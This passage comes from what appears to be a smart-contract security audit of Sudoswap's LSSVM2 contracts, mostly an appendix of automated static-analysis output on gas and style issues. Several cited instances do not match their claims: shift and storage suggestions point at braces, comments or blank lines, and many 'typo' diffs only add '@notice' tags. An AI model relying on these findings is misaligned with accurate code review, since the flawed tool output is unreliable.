Given that there are multiple instances where `token()` is called directly, the local variable `ERC20 token_ = token()` should be cached in the same manner as `_assetRecipient` at the start of the function to reduce the number of storage reads.

It is also recommended to cache `factory()` in `LSSVMPairERC1155::swapTokenForSpecificNFTs` and `LSSVMPairERC721::swapTokenForSpecificNFTs`. There is no need to cache `poolType()` in `LSSVMPairERC1155::swapNFTsForToken`, `LSSVMPairERC721::swapTokenForSpecificNFTs` and `LSSVMPairERC721::_swapNFTsForToken` as it is used only once.

# Additional Comments
We have identified several findings that were also highlighted in the Sudoswap LSSVM2 Security Review by Spearbit. While already acknowledged by the Sudorandom Labs team, we are highlighting them again here as we believe they are issues still worth resolving.
In particular, these include:
* `VeryFastRouter::swap` could mix tokens with ETH (Spearbit 5.2.4) which could be chained with our 6.1.2
* User can lose excess NFTs on calling `ILSSVMPair::swapNFTsForToken` for a pool with `LinearCurve` (Spearbit 5.2.9)
* Divisions in `ICurve::getBuyInfo` and `ICurve::getSellInfo` may be rounded down to 0 (Spearbit 5.3.19)

# Appendix

## 4nalyz3r Output
Attached below is the output of running the 4nalyz3r static analysis tool on the contracts in this repository:

### Gas Optimizations


| |Issue|Instances|
|-|:-|:-:|
| [GAS-1](#GAS-1) | Use `selfbalance()` instead of `address(this).balance` | 4 |
| [GAS-2](#GAS-2) | Use assembly to check for `address(0)` | 10 |
| [GAS-3](#GAS-3) | `array[index] += amount` is cheaper than `array[index] = array[index] + amount` (or related variants) | 2 |
| [GAS-4](#GAS-4) | Using bools for storage incurs overhead | 3 |
| [GAS-5](#GAS-5) | Cache array length outside of loop | 22 |
| [GAS-6](#GAS-6) | Use calldata instead of memory for function arguments that do not get mutated | 3 |
| [GAS-7](#GAS-7) | Use Custom Errors | 21 |
| [GAS-8](#GAS-8) | Don't initialize variables with default value | 10 |
| [GAS-9](#GAS-9) | Using `private` rather than `public` for constants, saves gas | 2 |
| [GAS-10](#GAS-10) | Use shift Right/Left instead of division/multiplication if possible | 13 |
| [GAS-11](#GAS-11) | Use `storage` instead of `memory` for structs/arrays | 29 |
| [GAS-12](#GAS-12) | Use != 0 instead of > 0 for unsigned integer comparison | 3 |
| [GAS-13](#GAS-13) | `internal` functions not called by the contract should be removed | 8 |
#### <a name="GAS-1"></a>[GAS-1] Use `selfbalance()` instead of `address(this).balance`
Use assembly when getting a contract's balance of ETH.

You can use `selfbalance()` instead of `address(this).balance` when getting your contract's balance of ETH to save gas.
Additionally, you can use `balance(address)` instead of `address.balance()` when getting an external contract's balance of ETH.

*Saves 15 gas when checking internal balance, 6 for external*

*Instances (4)*:
```solidity
File: LSSVMPairETH.sol

91:         withdrawETH(address(this).balance);

```

```solidity
File: LSSVMPairFactory.sol

421:         protocolFeeRecipient.safeTransferETH(address(this).balance);

```

```solidity
File: VeryFastRouter.sol

172:             balance = address(pair).balance;

```

```solidity
File: settings/Splitter.sol

27:         uint256 ethBalance = address(this).balance;

```

#### <a name="GAS-2"></a>[GAS-2] Use assembly to check for `address(0)`
*Saves 6 gas per instance*

*Instances (10)*:
```solidity
File: LSSVMPair.sol

139:         if (owner() != address(0)) revert LSSVMPair__AlreadyInitialized();

152:         if (_assetRecipient != address(0)) {

333:         if (_assetRecipient == address(0)) {

346:         if (_feeRecipient == address(0)) {

```

```solidity
File: LSSVMPairFactory.sol

438:         if (_protocolFeeRecipient == address(0)) revert LSSVMPairFactory__ZeroAddress();

501:         if (settingsAddress == address(0)) {

```

```solidity
File: erc721/LSSVMPairERC721.sol

98:             if (propertyChecker() != address(0)) revert LSSVMPairERC721__NeedPropertyChecking();

255:                 if ((numNFTs > 1) && (propertyChecker() == address(0))) {

```

```solidity
File: lib/OwnableWithTransferCallback.sol

46:         if (newOwner == address(0)) revert Ownable_NewOwnerZeroAddress();

```

```solidity
File: settings/StandardSettings.sol

45:         require(owner() == address(0), "Initialized");

```

#### <a name="GAS-3"></a>[GAS-3] `array[index] += amount` is cheaper than `array[index] = array[index] + amount` (or related variants)
When updating a value in an array with arithmetic, using `array[index] += amount` is cheaper than `array[index] = array[index] + amount`.
This is because you avoid an additonal `mload` when the array is stored in memory, and an `sload` when the array is stored in storage.
This can be applied for any arithmetic operation including `+=`, `-=`,`/=`,`*=`,`^=`,`&=`, `%=`, `<<=`,`>>=`, and `>>>=`.
This optimization can be particularly significant if the pattern occurs during a loop.

*Saves 28 gas for a storage array, 38 for a memory array*

*Instances (2)*:
```solidity
File: VeryFastRouter.sol

126:                 prices[i] = prices[i] + (prices[i] * slippageScaling / 1e18);

218:                 outputAmounts[i] = outputAmounts[i] - (outputAmounts[i] * slippageScaling / 1e18);

```

#### <a name="GAS-4"></a>[GAS-4] Using bools for storage incurs overhead
Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from false to true, after having been true in the past. See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27).

*Instances (3)*:
```solidity
File: LSSVMPairFactory.sol

56:     mapping(ICurve => bool) public bondingCurveAllowed;

57:     mapping(address => bool) public override callAllowed;

60:     mapping(address => mapping(address => bool)) public settingsForCollection;

```

#### <a name="GAS-5"></a>[GAS-5] Cache array length outside of loop
If not cached, the solidity compiler will always read the length of the array during each iteration. That is, if it is a storage array, this is an extra sload operation (100 additional extra gas for each iteration except for the first) and if it is a memory array, this is an extra mload operation (3 additional gas for each iteration except for the first).

*Instances (22)*:
```solidity
File: LSSVMPair.sol

673:         for (uint256 i; i < calls.length;) {

```

```solidity
File: LSSVMPairERC20.sol

68:             for (uint256 i; i < royaltyRecipients.length;) {

93:             for (uint256 i; i < royaltyRecipients.length;) {

```

```solidity
File: LSSVMPairETH.sol

57:         for (uint256 i; i < royaltyRecipients.length;) {

```

```solidity
File: LSSVMRouter.sol

215:                 swapList[i].swapInfo.nftIds[0], swapList[i].swapInfo.nftIds.length

262:                 swapList[i].swapInfo.nftIds[0], swapList[i].swapInfo.nftIds.length

305:                 (error,,, pairOutput,,) = swapList[i].swapInfo.pair.getSellNFTQuote(nftIds[0], nftIds.length);

354:                     params.tokenToNFTTrades[i].swapInfo.nftIds[0], params.tokenToNFTTrades[i].swapInfo.nftIds.length

387:                         assetId, params.nftToTokenTrades[i].swapInfo.nftIds.length

437:                     params.tokenToNFTTrades[i].swapInfo.nftIds[0], params.tokenToNFTTrades[i].swapInfo.nftIds.length

463:                         assetId, params.nftToTokenTrades[i].swapInfo.nftIds.length

```

```solidity
File: RoyaltyEngine.sol

182:                 for (uint256 i = 0; i < royalties.length;) {

264:                 for (uint256 i = 0; i < royalties.length;) {

```

```solidity
File: VeryFastRouter.sol

125:             for (uint256 i = 0; i < prices.length;) {

217:             for (uint256 i = 0; i < outputAmounts.length;) {

275:         for (uint256 i; i < swapOrder.sellOrders.length;) {

387:         for (uint256 i; i < swapOrder.buyOrders.length;) {

```

```solidity
File: erc1155/LSSVMPairERC1155.sol

143:         for (uint256 i; i < royaltyRecipients.length;) {

```

```solidity
File: erc721/LSSVMPairERC721.sol

52:             _calculateBuyInfoAndUpdatePoolParams(nftIds.length, bondingCurve(), factory());

172:         (protocolFee, outputAmount) = _calculateSellInfoAndUpdatePoolParams(nftIds.length, bondingCurve(), _factory);

189:         for (uint256 i; i < royaltyRecipients.length;) {

```

```solidity
File: settings/StandardSettings.sol

318:         for (uint256 i; i < splitterAddresses.length;) {

```

#### <a name="GAS-6"></a>[GAS-6] Use calldata instead of memory for function arguments that do not get mutated
Mark data types as `calldata` instead of `memory` where possible. This makes it so that the data is not automatically loaded into memory. If the data passed into the function does not need to be changed (like updating values in an array), it can be passed in as `calldata`. The one exception to this is if the argument must later be passed into another function that takes an argument that specifies `memory` storage.

*Instances (3)*:
```solidity
File: lib/IOwnershipTransferReceiver.sol

6:     function onOwnershipTransferred(address oldOwner, bytes memory data) external payable;

```

```solidity
File: lib/OwnableWithTransferCallback.sol

45:     function transferOwnership(address newOwner, bytes memory data) public payable virtual onlyOwner {

```

```solidity
File: settings/StandardSettings.sol

124:     function onOwnershipTransferred(address prevOwner, bytes memory) public payable {

```

#### <a name="GAS-7"></a>[GAS-7] Use Custom Errors
[Source](https://blog.soliditylang.org/2021/04/21/custom-errors/)
Instead of using error strings, to reduce deployment and runtime cost, you should use Custom Errors. This would save both deployment and runtime cost.

*Instances (21)*:
```solidity
File: LSSVMRouter.sol

504:         require(factory.isValidPair(msg.sender), "Not pair");

506:         require(factory.getPairTokenType(msg.sender) == ILSSVMPairFactoryLike.PairTokenType.ERC20, "Not ERC20 pair");

522:         require(factory.isValidPair(msg.sender), "Not pair");

536:         require(factory.isValidPair(msg.sender), "Not pair");

549:         require(block.timestamp <= deadline, "Deadline passed");

578:             require(error == CurveErrorCodes.Error.OK, "Bonding curve error");

658:         require(outputAmount >= minOutput, "outputAmount too low");

```

```solidity
File: settings/StandardSettings.sol

45:         require(owner() == address(0), "Initialized");

128:         require(pair.poolType() == ILSSVMPair.PoolType.TRADE, "Only TRADE pairs");

131:         require(pair.fee() <= MAX_SETTABLE_FEE, "Fee too high");

134:         require(msg.value == getSettingsCost(), "Insufficient payment");

144:             revert("Pair verification failed");

178:             require(block.timestamp > pairInfo.unlockTime, "Lockup not over");

180:             revert("Not prev owner or authed");

214:         require(msg.sender == pairInfo.prevOwner, "Not prev owner");

215:         require(newFee <= MAX_SETTABLE_FEE, "Fee too high");

231:         require(msg.sender == pairInfo.prevOwner, "Not prev owner");

309:         revert("Pricing and liquidity mismatch");

```

```solidity
File: settings/StandardSettingsFactory.sol

28:         require(royaltyBps <= (BASE / 10), "Max 10% for modified royalty bps");

29:         require(feeSplitBps <= BASE, "Max 100% for trade fee bps split");

30:         require(secDuration <= ONE_YEAR_SECS, "Max lock duration 1 year");

```

#### <a name="GAS-8"></a>[GAS-8] Don't initialize variables with default value

*Instances (10)*:
```solidity
File: RoyaltyEngine.sol

35:     int16 private constant NOT_CONFIGURED = 0;

81:         for (uint256 i = 0; i < numTokens;) {

182:                 for (uint256 i = 0; i < royalties.length;) {

264:                 for (uint256 i = 0; i < royalties.length;) {

336:         for (uint256 i = 0; i < numBps;) {

349:         for (uint256 i = 0; i < numRoyalties;) {

```

```solidity
File: VeryFastRouter.sol

125:             for (uint256 i = 0; i < prices.length;) {

217:             for (uint256 i = 0; i < outputAmounts.length;) {

632:         uint256 numIdsFound = 0;

```

```solidity
File: erc721/LSSVMPairERC721.sol

257:                     for (uint256 i = 0; i < numNFTs;) {

```

#### <a name="GAS-9"></a>[GAS-9] Using `private` rather than `public` for constants, saves gas
If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table

*Instances (2)*:
```solidity
File: bonding-curves/ExponentialCurve.sol

15:     uint256 public constant MIN_PRICE = 1000000 wei;

```

```solidity
File: bonding-curves/GDACurve.sol

21:     uint256 public constant MIN_PRICE = 1 gwei;

```

#### <a name="GAS-10"></a>[GAS-10] Use shift Right/Left instead of division/multiplication if possible
Shifting left by N is like multiplying by 2^N and shifting right by N is like dividing by 2^N

*Instances (13)*:
```solidity
File: LSSVMPairFactory.sol

335:     }

```

```solidity
File: VeryFastRouter.sol

535:             );

544:             ) {

546:             }

550:                 start = (start + end) / 2 + 1;

551:                 priceToFillAt = currentCost;

594:                 // get feeMultiplier from deltaAndFeeMultiplier

605:                     || currentOutput > pairTokenBalance

608:             }

612:                 start = (start + end) / 2 + 1;

613:                 priceToFillAt = currentOutput;

```

```solidity
File: bonding-curves/LinearCurve.sol

77:

145:

```

#### <a name="GAS-11"></a>[GAS-11] Use `storage` instead of `memory` for structs/arrays
Using `memory` copies the struct or array in memory. Use `storage` to save the location in storage and have cheaper reads:

*Instances (29)*:
```solidity
File: LSSVMPair.sol

492:             ROYALTY_ENGINE.getRoyalty(nft(), assetId, saleAmount);

505:             ROYALTY_ENGINE.getRoyaltyView(nft(), assetId, saleAmount);

679:             if (!success && revertOnFail) {

```

```solidity
File: LSSVMRouter.sol

299:                 if (nftIds.length == 0) {

```

```solidity
File: RoyaltyEngine.sol

87:                 _getRoyaltyAndSpec(tokenAddresses[i], tokenIds[i], values[i]);

126:             _getRoyaltyAndSpec(tokenAddress, tokenId, value);

318:             abi.encodeWithSelector(IRoyaltyRegistry.getRoyaltyLookupAddress.selector, tokenAddress)

```

```solidity
File: VeryFastRouter.sol

100:

180:         arr[0] = valueToWrap;

194:

437:

632:         uint256 numIdsFound = 0;

653:             for (uint256 i; i < numIdsFound;) {

663:         return emptyArr;

```

```solidity
File: erc1155/LSSVMPairERC1155.sol

60:             _calculateRoyalties(nftId(), inputAmountExcludingRoyalty - protocolFee - tradeFee);

129:             _calculateRoyalties(nftId(), outputAmount);

213:             ids[0] = _nftId;

215:             amounts[0] = numNFTs;

```

```solidity
File: erc721/LSSVMPairERC721.sol

56:             _calculateRoyalties(nftIds[0], inputAmountExcludingRoyalty - protocolFee - tradeFee);

176:             _calculateRoyalties(nftIds[0], outputAmount);

```

```solidity
File: property-checking/MerklePropertyChecker.sol

22:         uint256 numIds = ids.length;

25:             if (!MerkleProof.verify(proof, root, keccak256(abi.encodePacked(ids[i])))) {

```

```solidity
File: property-checking/PropertyCheckerFactory.sol

27:         MerklePropertyChecker checker = MerklePropertyChecker(address(merklePropertyCheckerImplementation).clone(data));

37:         RangePropertyChecker checker = RangePropertyChecker(address(rangePropertyCheckerImplementation).clone(data));

```

```solidity
File: settings/StandardSettings.sol

158:         address splitterAddress = address(splitterImplementation).clone(data);

172:

213:         // Verify that the caller is the previous owner of the pair

229:

```

```solidity
File: settings/StandardSettingsFactory.sol

32:         settings = StandardSettings(address(standardSettingsImplementation).clone(data));

```

#### <a name="GAS-12"></a>[GAS-12] Use != 0 instead of > 0 for unsigned integer comparison

*Instances (3)*:
```solidity
File: LSSVMRouter.sol

233:         if (remainingValue > 0) {

372:             if (remainingValue > 0) {

592:         if (remainingValue > 0) {

```

#### <a name="GAS-13"></a>[GAS-13] `internal` functions not called by the contract should be removed
If the functions are required by an interface, the contract should inherit from that interface and use the `override` keyword

*Instances (8)*:
```solidity
File: lib/LSSVMPairCloner.sol

22:     function cloneERC721ETHPair(

112:     function cloneERC721ERC20Pair(

204:     function isERC721ETHPairClone(address factory, address implementation, address query)

238:     function isERC721ERC20PairClone(address factory, address implementation, address query)

274:         address implementation,

361:         ILSSVMPairFactoryLike factory,

450:         returns (bool result)

484:         returns (bool result)

```


### Non Critical Issues


| |Issue|Instances|
|-|:-|:-:|
| [NC-1](#NC-1) | Missing checks for `address(0)` when assigning values to address state variables | 4 |
| [NC-2](#NC-2) |  `require()`/`revert()`statements should have descriptive reason strings | 1 |
| [NC-3](#NC-3) | Event is missing `indexed` fields | 18 |
| [NC-4](#NC-4) | Constants should be defined rather than using magic numbers | 3 |
| [NC-5](#NC-5) | Functions not used internally could be marked external | 28 |
| [NC-6](#NC-6) | Typos | 84 |
#### <a name="NC-1"></a>[NC-1] Missing checks for `address(0)` when assigning values to address state variables

*Instances (4)*:
```solidity
File: LSSVMPairFactory.sol

110:         _caller = _NOT_ENTERED;

349:         _caller = _NOT_ENTERED;

```

```solidity
File: lib/OwnableWithTransferCallback.sol

25:         _owner = initialOwner;

71:         _owner = newOwner;

```

#### <a name="NC-2"></a>[NC-2]  `require()`/`revert()`statements should have descriptive reason strings

*Instances (1)*:
```solidity
File: LSSVMPairETH.sol

126:         require(msg.data.length == _immutableParamsLength());

```

#### <a name="NC-3"></a>[NC-3] Event is missing `indexed` fields
Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.

*Instances (18)*:
```solidity
File: LSSVMPair.sol

82:     event SwapNFTInPair(uint256 amountIn, uint256[] ids);

83:     event SwapNFTInPair(uint256 amountIn, uint256 numNFTs);

84:     event SwapNFTOutPair(uint256 amountOut, uint256[] ids);

85:     event SwapNFTOutPair(uint256 amountOut, uint256 numNFTs);

86:     event SpotPriceUpdate(uint128 newSpotPrice);

87:     event TokenDeposit(uint256 amount);

88:     event TokenWithdrawal(uint256 amount);

89:     event NFTWithdrawal(uint256[] ids);

90:     event NFTWithdrawal(uint256 numNFTs);

91:     event DeltaUpdate(uint128 newDelta);

92:     event FeeUpdate(uint96 newFee);

```

```solidity
File: LSSVMPairFactory.sol

75:     event ERC20Deposit(address indexed poolAddress, uint256 amount);

76:     event NFTDeposit(address indexed poolAddress, uint256[] ids);

77:     event ERC1155Deposit(address indexed poolAddress, uint256 indexed id, uint256 amount);

79:     event ProtocolFeeMultiplierUpdate(uint256 newMultiplier);

80:     event BondingCurveStatusUpdate(ICurve indexed bondingCurve, bool isAllowed);

81:     event CallTargetStatusUpdate(address indexed target, bool isAllowed);

82:     event RouterStatusUpdate(LSSVMRouter indexed router, bool isAllowed);

```

#### <a name="NC-4"></a>[NC-4] Constants should be defined rather than using magic numbers

*Instances (3)*:
```solidity
File: settings/Splitter.sol

23:         return _getArgAddress(20);

```

```solidity
File: settings/StandardSettings.sol

70:         return _getArgUint64(40);

77:         return _getArgUint64(48);

```

#### <a name="NC-5"></a>[NC-5] Functions not used internally could be marked external

*Instances (28)*:
```solidity
File: LSSVMPair.sol

323:     function getAssetRecipient() public view returns (address payable) {

344:     function getFeeRecipient() public view returns (address payable _feeRecipient) {

```

```solidity
File: LSSVMPairFactory.sol

342:     function openLock() public {

347:     function closeLock() public {

499:     function getSettingsForPair(address pairAddress) public view returns (bool settingsEnabled, uint96 bps) {

513:     function toggleSettingsForCollection(address settings, address collectionAddress, bool enable) public {

529:     function enableSettingsForPair(address settings, address pairAddress) public {

546:     function disableSettingsForPair(address settings, address pairAddress) public {

```

```solidity
File: RoyaltyEngine.sol

66:     function getCachedRoyaltySpec(address tokenAddress) public view returns (int16) {

77:     function bulkCacheSpecs(address[] calldata tokenAddresses, uint256[] calldata tokenIds, uint256[] calldata values)

100:     function getRoyalty(address tokenAddress, uint256 tokenId, uint256 value)

119:     function getRoyaltyView(address tokenAddress, uint256 tokenId, uint256 value)

```

```solidity
File: erc721/LSSVMPairERC721ERC20.sol

27:     function pairVariant() public pure override returns (ILSSVMPairFactoryLike.PairVariant) {

```

```solidity
File: erc721/LSSVMPairERC721ETH.sol

27:     function pairVariant() public pure override returns (ILSSVMPairFactoryLike.PairVariant) {

```

```solidity
File: property-checking/PropertyCheckerFactory.sol

25:     function createMerklePropertyChecker(bytes32 root) public returns (MerklePropertyChecker) {

32:     function createRangePropertyChecker(uint256 startInclusive, uint256 endInclusive)

```

```solidity
File: settings/Splitter.sol

26:     function withdrawAllETHInSplitter() public {

41:     function withdrawAllBaseQuoteTokens() public {

47:     function withdrawAllTokens(ERC20 token) public {

```

```solidity
File: settings/StandardSettings.sol

44:     function initialize(address _owner, address payable _settingsFeeRecipient) public {

69:     function getFeeSplitBps() public pure returns (uint64) {

85:     function setSettingsFeeRecipient(address payable newFeeRecipient) public onlyOwner {

95:     function getPrevFeeRecipientForPair(address pairAddress) public view returns (address) {

124:     function onOwnershipTransferred(address prevOwner, bytes memory) public payable {

170:     function reclaimPair(address pairAddress) public {

211:     function changeFee(address pairAddress, uint96 newFee) public {

225:     function changeSpotPriceAndDelta(address pairAddress, uint128 newSpotPrice, uint128 newDelta, uint256 assetId)

```

```solidity
File: settings/StandardSettingsFactory.sol

21:     function createSettings(

```

#### <a name="NC-6"></a>[NC-6] Typos

*Instances (84)*:
```diff
File: LSSVMPair.sol

- 52:     // Sudoswap Royalty Engine
+ 52:     // @notice Sudoswap Royalty Engine

- 60:     // However, this should NOT be assumed, as bonding curves may use spotPrice in different ways.
+ 60:     // @notice However, this should NOT be assumed, as bonding curves may use spotPrice in different ways.

- 61:     // Use getBuyNFTQuote and getSellNFTQuote for accurate pricing info.
+ 61:     // @notice Use getBuyNFTQuote and getSellNFTQuote for accurate pricing info.

- 65:     // Units and meaning are bonding curve dependent.
+ 65:     // @notice Units and meaning are bonding curve dependent.

- 68:     // The spread between buy and sell prices, set to be a multiplier we apply to the buy price
+ 68:     // @notice The spread between buy and sell prices, set to be a multiplier we apply to the buy price

- 69:     // Fee is only relevant for TRADE pools
+ 69:     // @notice Fee is only relevant for TRADE pools

- 70:     // Units are in base 1e18
+ 70:     // @notice Units are in base 1e18

- 73:     // The address that swapped assets are sent to
+ 73:     // @notice The address that swapped assets are sent to

- 74:     // For TRADE pools, assets are always sent to the pool, so this is used to track trade fee
+ 74:     // @notice For TRADE pools, assets are always sent to the pool, so this is used to track trade fee

- 75:     // If set to address(0), will default to owner() for NFT and TOKEN pools
+ 75:     // @notice If set to address(0), will default to owner() for NFT and TOKEN pools

- 235:             // Calculate the inputAmount minus tradeFee and protocolFee
+ 235:             // @notice Calculate the inputAmount minus tradeFee and protocolFee

- 238:             // Compute royalties
+ 238:             // @notice Compute royalties

- 265:             // Compute royalties
+ 265:             // @notice Compute royalties

- 268:             // Deduct royalties from outputAmount
+ 268:             // @notice Deduct royalties from outputAmount

- 270:                 // Safe because we already require outputAmount >= royaltyAmount in _calculateRoyalties()
+ 270:                 // @notice Safe because we already require outputAmount >= royaltyAmount in _calculateRoyalties()

- 324:         // TRADE pools will always receive the asset themselves
+ 324:         // @notice TRADE pools will always receive the asset themselves

- 331:         // Otherwise, we return the recipient if it's been set
+ 331:         // @notice Otherwise, we return the recipient if it's been set

- 332:         // Or, we replace it with owner() if it's address(0)
+ 332:         // @notice Or, we replace it with owner() if it's address(0)

- 369:         // Save on 2 SLOADs by caching
+ 369:         // @notice Save on 2 SLOADs by caching

- 377:         // Revert if bonding curve had an error
+ 377:         // @notice Revert if bonding curve had an error

- 382:         // Consolidate writes to save gas
+ 382:         // @notice Consolidate writes to save gas

- 388:         // Emit spot price update if it has been updated
+ 388:         // @notice Emit spot price update if it has been updated

- 393:         // Emit delta update if it has been updated
+ 393:         // @notice Emit delta update if it has been updated

- 413:         // Save on 2 SLOADs by caching
+ 413:         // @notice Save on 2 SLOADs by caching

- 421:         // Revert if bonding curve had an error
+ 421:         // @notice Revert if bonding curve had an error

- 426:         // Consolidate writes to save gas
+ 426:         // @notice Consolidate writes to save gas

- 432:         // Emit spot price update if it has been updated
+ 432:         // @notice Emit spot price update if it has been updated

- 437:         // Emit delta update if it has been updated
+ 437:         // @notice Emit delta update if it has been updated

- 517:         // cache to save gas
+ 517:         // @notice cache to save gas

- 521:             // If a pair has custom Settings, use the overridden royalty amount and only use the first receiver
+ 521:             // @notice If a pair has custom Settings, use the overridden royalty amount and only use the first receiver

- 529:                 // update numRecipients to match new recipients list
+ 529:                 // @notice update numRecipients to match new recipients list

- 544:         // Ensure royalty total is at most 25% of the sale amount
+ 544:         // @notice Ensure royalty total is at most 25% of the sale amount

- 545:         // This defends against a rogue Manifold registry that charges extremely
+ 545:         // @notice This defends against a rogue Manifold registry that charges extremely

- 546:         // high royalties
+ 546:         // @notice high royalties

- 644:         // Ensure the call isn't calling a banned function
+ 644:         // @notice Ensure the call isn't calling a banned function

- 655:         // Prevent calling the pair's underlying nft
+ 655:         // @notice Prevent calling the pair's underlying nft

- 656:         // (We ban calling the underlying NFT/ERC20 to avoid maliciously transferring assets approved for the pair to spend)
+ 656:         // @notice (We ban calling the underlying NFT/ERC20 to avoid maliciously transferring assets approved for the pair to spend)

- 675:             // We ban calling transferOwnership when ownership
+ 675:             // @notice We ban calling transferOwnership when ownership

```

```diff
File: LSSVMPairERC20.sol

- 92:             // Transfer royalties (if they exists)
+ 92:             // Transfer royalties (if they exist)

- 105:         // Send trade fee if it exists, is TRADE pool, and fee recipient != pool address
+ 105:         // Send trade fee if it exists, is TRADE pool, and fee recipient is not pool address

```

```diff
File: LSSVMPairETH.sol

- 31:         // Require that the input amount is sufficient to pay for the sale amount and royalties
+ 31:         // Require that the input amount is sufficient to pay for the sale amount, royalties, and fees

- 34:         // Transfer inputAmountExcludingRoyalty ETH to assetRecipient if it's been set
+ 34:         // Transfer inputAmountExcludingRoyalty ETH to assetRecipient if it has been set

```

```diff
File: LSSVMPairFactory.sol

- 470:         // ensure target is not / was not ever a router
+ 470:         // Ensure target is not / was not ever a router

- 485:         // ensure target is not arbitrarily callable by pairs
+ 485:         // Ensure target is not arbitrarily callable by pairs

- 570:         // transfer initial ETH to pair
+ 570:         // Transfer initial ETH to pair

- 573:         // transfer initial NFTs from sender to pair
+ 573:         // Transfer initial NFTs from sender to pair

- 598:         // transfer initial tokens to pair (if != 0)
+ 598:         // Transfer initial tokens to pair (if != 0)

- 603:         // transfer initial NFTs from sender to pair
+ 603:         // Transfer initial NFTs from sender to pair

- 627:         // transfer initial ETH to pair
+ 627:         // Transfer initial ETH to pair

- 630:         // transfer initial NFTs from sender to pair
+ 630:         // Transfer initial NFTs from sender to pair

- 651:         // transfer initial tokens to pair
+ 651:         // Transfer initial tokens to pair

- 656:         // transfer initial NFTs from sender to pair
+ 656:         // Transfer initial NFTs from sender to pair

- 668:         // early return for trivial transfers
+ 668:         // Early return for trivial transfers

- 671:         // transfer NFTs from caller to recipient
+ 671:         // Transfer NFTs from caller to recipient

- 688:         // early return for trivial transfers
+ 688:         // Early return for trivial transfers

```

```diff
File: VeryFastRouter.sol

- 116:             // Set the price to buy numNFT - i items
+ 116:             // Set the price to buy numNFTs - i items

- 204:             // Calculate output to sell the remaining numNFTs - i items, factoring in royalties
+ 204:             // Calculate output to sell the remaining numNFTs - i items, factoring in royalties and fees

```

```diff
File: bonding-curves/CurveErrorCodes.sol

- 7:         INVALID_NUMITEMS, // The numItem value is 0
+ 7:         INVALID_NUMITEMS, // The numItems value is 0

- 10:         SPOT_PRICE_UNDERFLOW // The updated spot price goes too low
+ 10:         SPOT_PRICE_UNDERFLOW // The updated spot price is too low

```

```diff
File: bonding-curves/ExponentialCurve.sol

- 53:         // NOTE: we assume delta is > 1, as checked by validateDelta()
+ 53:         // NOTE: we assume delta is > 1, as checked by validateDelta

- 123:         // NOTE: we assume delta is > 1, as checked by validateDelta()
+ 123:         // NOTE: we assume delta is > 1, as checked by validateDelta

- 153:         // Account for the trade fee, only for Trade pools
+ 153:         // Account for the trade fee, only for TRADE pools

```

```diff
File: bonding-curves/GDACurve.sol

- 218:         // however, because our alpha value needs to be 18 decimals of precision, we multiple by a scaling factor
+ 218:         // however, because our alpha value needs to be 18 decimals of precision, we multiply by a scaling factor

- 224:         // lambda also needs to be 18 decimals of precision so we multiple by a scaling factor
+ 224:         // lambda also needs to be 18 decimals of precision so we multiply by a scaling factor

- 228:         // this works because solidity cuts off higher bits when converting
+ 228:         // this works because solidity cuts off higher bits when converting from a larger type to a smaller type

- 229:         // from a larger type to a smaller type
+ 229:         // see https://docs.soliditylang.org/en/latest/types.html#explicit-conversions

- 230:         // see https://docs.soliditylang.org/en/latest/types.html#explicit-conversions
+ 230:         // Clear lower 48 bits

- 235:         // Clear lower 48 bits
+ 235:         // Set lower 48 bits to be the current timestamp

237:         // Set lower 48 bits to be the current timestamp

```

```diff
File: bonding-curves/LinearCurve.sol

- 69:         // The new spot price would become (S+delta), so selling would also yield (S+delta) ETH.
+ 69:         // The new spot price would become (S+delta), so selling would also yield (S+delta) ETH, netting them delta ETH profit.

- 75:         // because we have n instances of buy spot price, and then we sum up from delta to (n-1)*delta
+ 75:         // because we have n instances of buy spot price, and then we sum up from 1*delta to (n-1)*delta

```

```diff
File: bonding-curves/XykCurve.sol

- 63:         // If numItems is too large, we will get divide by zero error
+ 63:         // If numItems is too large, we will get a divide by zero error

- 84:         // If we got all the way here, no math error happened
+ 84:         // If we got all the way here, no math errors happened

- 134:         // If we got all the way here, no math error happened
+ 134:         // If we got all the way here, no math errors happened

```

```diff
File: erc1155/LSSVMPairERC1155.sol

- 258:             // check if we need to emit an event for withdrawing the NFT this pool is trading
+ 258: // Check if we need to emit an event for withdrawing the NFT this pool is trading

- 272:                 // only emit for the pair's NFT
+ 272: // Only emit for the pair's NFT

```

```diff
File: erc721/LSSVMPairERC721.sol

- 254:                 // If more than 1 NFT is being transfered, and there is no property checker, we can do a balance check instead of an ownership check, as pools are indifferent between NFTs from the same collection
+ 254: // If more than 1 NFT is being transferred, and there is no property checker, we can do a balance check instead of an ownership check, as pools are indifferent between NFTs from the same collection

```

```diff
File: lib/LSSVMPairCloner.sol

- 170:             // 60 0x33     | PUSH1 0x33            | 0x33 sucess 0 rds       | [0, rds) = return data
+ 170:             // 60 0x33     | PUSH1 0x33            | 0x33 success 0 rds      | [0, rds) = return data

- 417:             // 60 0x33     | PUSH1 0x33            | 0x33 sucess 0 rds       | [0, rds) = return data
+ 417:             // 60 0x33     | PUSH1 0x33            | 0x33 success 0 rds      | [0, rds) = return data

```

```diff
File: lib/OwnableWithTransferCallback.sol

- 51:             // If revert...
+ 51: /// If revert...

- 53:                 // If we just transferred to a contract w/ no callback, this is fine
+ 53: /// If we just transferred to a contract w/ no callback, this is fine

- 55:                     // i.e., no need to revert
+ 55: /// i.e., no need to revert

- 57:                 // Otherwise, the callback had an error, and we should revert
+ 57: /// Otherwise, the callback had an error, and we should revert

```

```diff
File: settings/StandardSettings.sol

- 26:     uint96 constant MAX_SETTABLE_FEE = 0.2e18; // Max fee of 20%
+ 26:     uint96 constant MAX_SETTABLE_FEE = 0.2e18; // Max fee of 20% (0.2)

```


### Low Issues


| |Issue|Instances|
